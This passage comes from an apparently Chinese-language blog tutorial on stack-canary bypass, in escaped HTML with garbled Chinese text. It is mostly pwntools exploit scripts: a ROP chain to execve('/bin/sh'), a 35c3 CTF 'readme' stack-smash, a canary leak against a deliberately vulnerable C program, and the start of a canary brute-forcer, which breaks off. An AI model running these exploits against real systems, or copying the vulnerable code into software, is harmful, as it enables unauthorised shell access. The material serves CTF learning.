&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">flat&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="s1">&amp;#39;22222222&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">pop_rdi_ret&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">next&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">search&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/bin/sh&amp;#34;&lt;/span>&lt;span class="p">)),&lt;/span>&lt;span class="n">pop_rdx_pop_rsi_ret&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sym&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;execve&amp;#39;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mi">80&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">7&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">8&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="s1">&amp;#39;2&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">stack&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mh">0x30&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x4006be&lt;/span>&lt;span class="p">])&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendafter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>Stack smash&lt;/li>
&lt;/ul>
&lt;p>35c3 CTF readme&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190522132544.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">addr_ow_flag&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x600d20&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">addr_flag&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x400d20&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">H&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">P&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;localhost&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">6666&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#r = process(&amp;#39;./readme.bin&amp;#39;)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">r&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">remote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">H&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">P&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">junk&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">r&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvuntil&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;What&amp;#39;s your name? &amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">exploit&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;A&amp;#34;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mh">0x218&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">exploit&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">addr_flag&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">exploit&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">exploit&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">addr_ow_flag&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">r&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">exploit&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">junk&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">r&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvuntil&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Please overwrite the flag: &amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">exploit&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;LIBC_FATAL_STDERR_=1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">r&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">exploit&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">junk&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">r&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvall&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span> &lt;span class="n">junk&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>æ ˆä¸Špartial overwrite&lt;/li>
&lt;/ul>
&lt;p>2018 å®‰æ’æ¯ babypie&lt;/p>
&lt;p>2018 XNUCA-gets&lt;/p>
&lt;h3 id="canary-ç»•è¿‡æŠ€æœ¯">Canary ç»•è¿‡æŠ€æœ¯&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>æ³„éœ²æ ˆä¸­çš„Canary&lt;/p>
&lt;p>è¦†ç›– Canary çš„ä½å­—èŠ‚ï¼Œæ¥æ‰“å°å‡ºå‰©ä½™çš„ Canary éƒ¨åˆ†&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// ex2.c
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="nf">getshell&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">system&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/bin/sh&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">init&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">setbuf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stdin&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">setbuf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stdout&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">setbuf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stderr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">vuln&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">100&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x200&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">init&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Hello Hacker!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">vuln&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>EXP&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="ch">#!/usr/bin/env python&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">context&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">binary&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;ex2&amp;#39;&lt;/span>&lt;span class="c1">#å…¨å±€ç³»ç»Ÿè‡ªåŠ¨è®¾ç½®ï¼Œä¸ºå®˜æ–¹æ¨èè®¾ç½®ï¼Œex2ä¸ºæ–‡ä»¶åç§°ã€‚&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#context.log_level = &amp;#39;debug&amp;#39;#debugæ¨¡å¼ä¸‹æ‰å¼€å¯&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">process&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;./ex2&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">#æœ¬åœ°è¿æ¥åˆ°ex2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">get_shell&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ELF&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;./ex2&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sym&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;getshell&amp;#34;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c1">#ç”±äºæºç é‡Œæœ‰getshellå‡½æ•°ï¼Œæ‰€ä»¥ç›´æ¥å¯ä»¥ä½¿ç”¨ELFæ¨¡å—æ‰¾åˆ°getshellå‡½æ•°åœ°å€ã€‚&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvuntil&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Hello Hacker!&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="c1">#æ¥å—ä¼ æ¥çš„ç¬¬ä¸€éƒ¨åˆ†å­—ç¬¦&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># leak Canary&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;A&amp;#34;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">100&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">#ä¼ è¾“100ä¸ªA&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvuntil&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;A&amp;#34;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">100&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Canary&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">u32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recv&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mh">0xa&lt;/span> &lt;span class="c1">#å› ä¸ºcannaryæœ€åä¸€ä½å­—èŠ‚ä¸º00è¢«0x0aè¦†ç›–ï¼Œæ‰€ä»¥å‡å»0x0a&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">info&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Canary:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nb">hex&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Canary&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="c1">#æ—¥å¿—è®°å½•ä¸‹canary&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Bypass Canary&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\x90&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">100&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">p32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Canary&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\x90&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">p32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">get_shell&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="c1">#å‘é€æœ€åçš„payload&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">send&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recv&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>one-by-one çˆ†ç ´ Canary&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span> &lt;span class="s2">&amp;#34;[+] Brute forcing stack canary &amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">start&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">stop&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">8&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">while&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">stop&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">xrange&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">256&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">send2server&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">res&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
